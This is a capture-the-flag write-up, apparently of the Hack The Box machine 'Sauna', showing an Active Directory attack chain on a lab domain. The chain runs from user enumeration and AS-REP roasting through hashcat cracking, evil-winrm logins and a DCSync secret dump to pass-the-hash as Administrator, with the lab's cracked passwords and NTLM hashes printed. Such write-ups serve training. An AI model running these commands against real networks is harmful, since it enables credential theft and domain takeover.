# Sauna
IP
```
10.10.10.175
```

```
53/tcp   open  domain?       syn-ack ttl 127
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-07-12 10:10:00Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site:
Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site:
Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127

```



LDAP search returns a user's name.

![[Pasted image 20220711221732.png]]

We found his username is `hsmith`

![[Pasted image 20220711223621.png]]

we did more user enumeration with

```
kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.local /usr/share/seclists/Usernames/userlist.txt
```

we found a new user: `fsmith` and used the following command to get an AS-REP hash

```
GetNPUsers.py egotistical-bank.local/ -usersfile users -format hashcat -outputfile as-rep.hash
```

we then cracked using hashcat

```
hashcat as-rep.hash /usr/share/wordlists/rockyou.txt
```

```
fsmith
```

```
Thestrokes23
```

we logged in using evil-winrm

```
evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175
```

and found the user flag on the desktop

![[Pasted image 20220711233853.png]]

we ran winpeas and found another set of credentials

![[Pasted image 20220711235616.png]]

However, this user didn't appear to be valid, but we found a similar user and this password worked!

```
svc_loanmgr
```

```
Moneymakestheworldgoround!
```


We then used the python bloodhound ingestor to collect domain info
```
bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d Egotistical-bank.local -dc 10.10.10.175 -c All
```

We loaded the .json files into bloodhound.

Found out our `svc_loanmgr`	account has DCSync privileges.

We dumped secrets with `secretesdump.py`

```
secretsdump.py -dc-ip 10.10.10.175 egotistical-bank.local/svc_loanmgr@10.10.10.175
```

which gave the following hashes

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::                                        
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::                                               
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::                       
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::                       
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::                  
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:cba7484ad743db3e4f1e6feb311f44d6:::
```

We are able to login as `Administrator` using the PTH function of evil-winrm

```
evil-winrm -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e -i 10.10.10.175
```

## Root flag

![[Pasted image 20220712001536.png]]